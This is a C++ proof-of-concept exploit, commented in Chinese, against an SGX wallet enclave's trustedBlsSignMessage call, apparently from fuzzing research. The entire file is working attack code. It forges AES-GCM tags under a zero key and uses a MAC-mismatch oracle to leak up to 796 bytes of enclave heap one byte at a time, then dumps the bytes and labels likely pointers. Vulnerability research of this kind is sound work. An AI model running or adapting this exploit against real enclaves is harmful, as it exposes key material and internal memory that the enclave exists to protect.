// PoC: trustedBlsSignMessage — 796-byte GCM MAC Oracle 泄露飞地堆
//
// 关键差异 vs trustedGetDecryptionShare (poc_heap_oracle):
//   - encrypted_key 代理缓冲区仅 256 字节 (EDL: [in, size=256])
//   - AES_decrypt 的 msgLen 上限仍为 1024
//   - OOB 窗口: 1024 - (256-28) = 796 字节 (28倍于原 PoC)
//
// 由于 libff 初始化后堆碎片化, encrypted_key 可能被分配到
// 堆中间的回收块, 其物理邻居是 libff 的内部对象而非 proxy 缓冲区。
// 796 字节足以穿越多个 chunk, 泄露真正的飞地内部数据。
//
// 编译:
//   g++ -std=c++17 -O2 -g \
//       -I/home/leone/EnclaveFuzz/install/enclave_fuzz_v/include -I. \
//       poc_bls_sign_oracle.cpp secure_enclave_u.o third_party/intel/oc_alloc.c \
//       -lsgx_urts -lssl -lcrypto \
//       -o poc_bls_sign_oracle
//
// 运行:
//   ./poc_bls_sign_oracle [max_oob_bytes]   (默认 796)

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <sgx_urts.h>
#include "secure_enclave_u.h"

// ── 常量 ─────────────────────────────────────────────────────────────────────
#define MAC_SIZE    16
#define IV_SIZE     12
#define BUF_256     256     // proxy 分配的 encrypted_key 大小
#define CT_IN_BUF   (BUF_256 - MAC_SIZE - IV_SIZE)  // = 228, 缓冲区内密文
#define MAX_CT      1024    // AES_decrypt 的 msgLen 上限
#define MAX_OOB     (MAX_CT - CT_IN_BUF)             // = 796

#define TYPE_BLS        '2'
#define EXPORTABLE_FLAG '1'
#define ENCLAVE_FILE    "secure_enclave/secure_enclave.signed.so"

#define SGX_ERROR_MAC_MISMATCH 12289  // 0x3001

static const char ATTACKER_KEY_HEX[65] =
    "deadbeefcafebabe1234567890abcdef"
    "deadbeefcafebabe1234567890abcdef";

// ── OCall 桩 ─────────────────────────────────────────────────────────────────
void ocall_SGXWalletServer_log(int level, const char *msg) {
    (void)level; (void)msg;
}

// ── 预计算 AES-CTR keystream (key=0) ─────────────────────────────────────────
static void compute_keystream(const uint8_t *key16, const uint8_t *iv,
                              uint8_t *keystream, int len) {
    uint8_t zeros[MAX_CT] = {0};
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    int outl = 0;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key16, iv);
    EVP_EncryptUpdate(ctx, keystream, &outl, zeros, len);
    EVP_CIPHER_CTX_free(ctx);
}

// ── 为指定密文计算 GCM tag ───────────────────────────────────────────────────
static void compute_tag_for_ct(const uint8_t *key16, const uint8_t *iv,
                               const uint8_t *keystream,
                               const uint8_t *desired_ct, int ct_len,
                               uint8_t *out_tag) {
    uint8_t pt[MAX_CT];
    for (int i = 0; i < ct_len; i++)
        pt[i] = desired_ct[i] ^ keystream[i];

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    uint8_t tmp[MAX_CT];
    int outl = 0;
    EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key16, iv);
    EVP_EncryptUpdate(ctx, tmp, &outl, pt, ct_len);
    EVP_EncryptFinal_ex(ctx, tmp + outl, &outl);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, MAC_SIZE, out_tag);
    EVP_CIPHER_CTX_free(ctx);
}

// ── main ─────────────────────────────────────────────────────────────────────
int main(int argc, char **argv) {
    int max_oob = MAX_OOB;
    if (argc > 1) max_oob = atoi(argv[1]);
    if (max_oob > MAX_OOB) max_oob = MAX_OOB;
    if (max_oob < 1) max_oob = 1;

    printf("=== PoC: trustedBlsSignMessage — 796B GCM MAC Oracle ===\n");
    printf("    encrypted_key 缓冲区: %d 字节\n", BUF_256);
    printf("    缓冲区内密文: %d 字节\n", CT_IN_BUF);
    printf("    OOB 窗口: %d / %d 字节\n\n", max_oob, MAX_OOB);

    // ── 加载飞地 ─────────────────────────────────────────────────────────────
    sgx_enclave_id_t eid = 0;
    sgx_launch_token_t token = {};
    int updated = 0;
    sgx_status_t st = sgx_create_enclave(
        ENCLAVE_FILE, SGX_DEBUG_FLAG, &token, &updated, &eid, NULL);
    if (st != SGX_SUCCESS) {
        fprintf(stderr, "[-] sgx_create_enclave failed: 0x%x\n", st);
        return 1;
    }
    printf("[+] 飞地加载成功\n");

    // ── trustedEnclaveInit ───────────────────────────────────────────────────
    st = trustedEnclaveInit(eid, 0);
    if (st != SGX_SUCCESS) {
        fprintf(stderr, "[-] trustedEnclaveInit failed: 0x%x\n", st);
        return 1;
    }
    printf("[+] trustedEnclaveInit 成功, AES_key = 0\n");

    // ── 准备 oracle 参数 ─────────────────────────────────────────────────────
    uint8_t zero_key[16] = {0};
    uint8_t iv[IV_SIZE];
    RAND_bytes(iv, IV_SIZE);

    // 预计算 keystream (最大密文长度 1024)
    uint8_t keystream[MAX_CT];
    compute_keystream(zero_key, iv, keystream, MAX_CT);

    // BLS 明文 (67 字节有效, 剩余填零 → 对应的密文也确定)
    uint8_t bls_pt[CT_IN_BUF] = {0};
    bls_pt[0] = TYPE_BLS;
    bls_pt[1] = EXPORTABLE_FLAG;
    memcpy(bls_pt + 2, ATTACKER_KEY_HEX, 64);
    bls_pt[66] = '\0';

    // 缓冲区内密文 (228 字节, 放在 forge_blob 的 CT 区域)
    uint8_t base_ct[CT_IN_BUF];
    for (int i = 0; i < CT_IN_BUF; i++)
        base_ct[i] = bls_pt[i] ^ keystream[i];

    // hashX / hashY: 必须是有效的 alt_bn128 G1 曲线点坐标
    // (0,0) 会导致 to_affine_coordinates 除零崩溃!
    // 使用 G1 生成元: (1, 2) 是 alt_bn128 的标准 G1 生成元
    char hashX[] = "1";
    char hashY[] = "2";

    // ── 基线验证 ─────────────────────────────────────────────────────────────
    printf("\n[*] 基线验证: zero-SEK 无 OOB ...\n");
    {
        uint8_t blob[BUF_256] = {0};
        memcpy(blob + MAC_SIZE, iv, IV_SIZE);

        // 67 字节密文 + tag
        uint8_t pt67[67];
        pt67[0] = TYPE_BLS; pt67[1] = EXPORTABLE_FLAG;
        memcpy(pt67 + 2, ATTACKER_KEY_HEX, 64); pt67[66] = '\0';

        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
        int outl = 0;
        EVP_EncryptInit_ex(ctx, EVP_aes_128_gcm(), NULL, NULL, NULL);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, NULL);
        EVP_EncryptInit_ex(ctx, NULL, NULL, zero_key, iv);
        EVP_EncryptUpdate(ctx, blob + MAC_SIZE + IV_SIZE, &outl, pt67, 67);
        EVP_EncryptFinal_ex(ctx, blob + MAC_SIZE + IV_SIZE + outl, &outl);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, MAC_SIZE, blob);
        EVP_CIPHER_CTX_free(ctx);

        int errStatus = -1;
        char errStr[256] = {0}, sig[1024] = {0};
        st = trustedBlsSignMessage(eid, &errStatus, errStr, blob,
                                   (uint64_t)(MAC_SIZE + IV_SIZE + 67),
                                   hashX, hashY, sig);
        printf("    sgx=0x%x errStatus=%d\n", st, errStatus);
        if (st != SGX_SUCCESS) {
            fprintf(stderr, "[-] 基线失败: sgx_status=0x%x (飞地可能崩溃)\n", st);
            fprintf(stderr, "    errString: %s\n", errStr);
            fprintf(stderr, "    提示: enclave_sign 可能因无效 hashX/hashY 崩溃\n");
            return 1;
        }
        if (errStatus == SGX_ERROR_MAC_MISMATCH) {
            fprintf(stderr, "[-] 基线失败: MAC 验证不通过 (SEK 非零?)\n");
            return 1;
        }
        printf("[+] 基线通过: MAC 验证成功 (errStatus=%d)\n", errStatus);
    }

    // ── Oracle 主循环 ────────────────────────────────────────────────────────
    printf("\n[*] 开始 oracle: 逐字节泄露 encrypted_key[%d] 之后 %d 字节\n",
           BUF_256, max_oob);
    printf("    每字节最多 256 次 ECALL, 总计最多 %d 次\n\n",
           256 * max_oob);

    uint8_t *leaked = (uint8_t *)calloc(max_oob, 1);
    uint8_t *leaked_ok = (uint8_t *)calloc(max_oob, 1);  // 1=found, 0=not
    int leaked_count = 0;
    int total_calls = 0;

    for (int pos = 0; pos < max_oob; pos++) {
        int ct_len = CT_IN_BUF + 1 + pos;  // 缓冲区内 228 + 已猜出 pos + 当前 1
        uint64_t key_len = (uint64_t)(ct_len + MAC_SIZE + IV_SIZE);

        // 构造 desired_ct 模板 (除最后 1 字节外固定)
        uint8_t desired_ct[MAX_CT];
        memcpy(desired_ct, base_ct, CT_IN_BUF);          // 228 字节已知密文
        for (int k = 0; k < pos; k++)                     // 之前猜出的 OOB 字节
            desired_ct[CT_IN_BUF + k] = leaked[k];

        int found = 0;
        for (int guess = 0; guess < 256; guess++) {
            desired_ct[CT_IN_BUF + pos] = (uint8_t)guess;

            // 计算此密文的 GCM tag
            uint8_t tag[MAC_SIZE];
            compute_tag_for_ct(zero_key, iv, keystream,
                               desired_ct, ct_len, tag);

            // 组装 forge_blob (256 字节)
            uint8_t forge_blob[BUF_256];
            memcpy(forge_blob, tag, MAC_SIZE);                      // [0..15]  MAC
            memcpy(forge_blob + MAC_SIZE, iv, IV_SIZE);             // [16..27] IV
            memcpy(forge_blob + MAC_SIZE + IV_SIZE, base_ct, CT_IN_BUF); // [28..255] CT

            int errStatus = -1;
            char errStr[256] = {0}, sig[1024] = {0};
            st = trustedBlsSignMessage(eid, &errStatus, errStr, forge_blob,
                                       key_len, hashX, hashY, sig);
            total_calls++;

            // oracle: sgx 成功 + MAC 匹配
            if (st == SGX_SUCCESS && errStatus != SGX_ERROR_MAC_MISMATCH) {
                leaked[pos] = (uint8_t)guess;
                leaked_ok[pos] = 1;
                leaked_count++;
                printf("  [+] +%03d: 0x%02x '%c'  (%d guesses, err=%d)\n",
                       pos, guess,
                       (guess >= 0x20 && guess < 0x7f) ? guess : '.',
                       guess + 1, errStatus);
                found = 1;
                break;
            }
        }

        if (!found) {
            printf("  [-] +%03d: 未找到匹配 (堆数据可能不稳定)\n", pos);
            leaked[pos] = 0x00;
            leaked_ok[pos] = 0;
        }

        // 每 50 字节打印进度
        if ((pos + 1) % 50 == 0) {
            printf("  --- 进度: %d/%d, ECALL: %d ---\n",
                   pos + 1, max_oob, total_calls);
        }
    }

    // ── 输出结果 ─────────────────────────────────────────────────────────────
    printf("\n=== 结果 ===\n");
    printf("总 ECALL: %d\n", total_calls);
    printf("成功泄露: %d / %d 字节\n\n", leaked_count, max_oob);

    // hex dump
    printf("Hex dump (偏移相对于 encrypted_key 缓冲区起始):\n");
    for (int i = 0; i < max_oob; i += 16) {
        printf("  +%04x |", BUF_256 + i);
        for (int j = 0; j < 16 && i + j < max_oob; j++) {
            if (leaked_ok[i + j])
                printf(" %02x", leaked[i + j]);
            else
                printf(" ??");
        }
        int rem = max_oob - i;
        if (rem < 16) for (int j = rem; j < 16; j++) printf("   ");
        printf("  |");
        for (int j = 0; j < 16 && i + j < max_oob; j++) {
            if (!leaked_ok[i + j]) { printf("?"); continue; }
            uint8_t c = leaked[i + j];
            printf("%c", (c >= 0x20 && c < 0x7f) ? c : '.');
        }
        printf("|\n");
    }

    // 分析非零区域
    printf("\n非零区域:\n");
    int run_start = -1;
    for (int i = 0; i <= max_oob; i++) {
        int is_nonzero = (i < max_oob) && leaked_ok[i] && (leaked[i] != 0x00);
        if (is_nonzero && run_start < 0) {
            run_start = i;
        } else if (!is_nonzero && run_start >= 0) {
            int run_len = i - run_start;
            printf("  +0x%03x..+0x%03x (%3d bytes): ",
                   BUF_256 + run_start, BUF_256 + i - 1, run_len);
            // 打印内容
            for (int j = run_start; j < i && j < run_start + 32; j++)
                printf("%02x", leaked[j]);
            if (run_len > 32) printf("...");

            // 8 字节对齐的值尝试解读为 uint64
            if (run_len >= 8 && (run_start % 8 == 0)) {
                uint64_t val = 0;
                memcpy(&val, leaked + run_start, 8);
                printf("  (u64: 0x%016lx", (unsigned long)val);
                if (val > 0x1000 && val < 0x800000000000ULL)
                    printf(" <- 可能是指针!");
                printf(")");
            }
            printf("\n");
            run_start = -1;
        }
    }

    free(leaked);
    free(leaked_ok);
    sgx_destroy_enclave(eid);
    return 0;
}
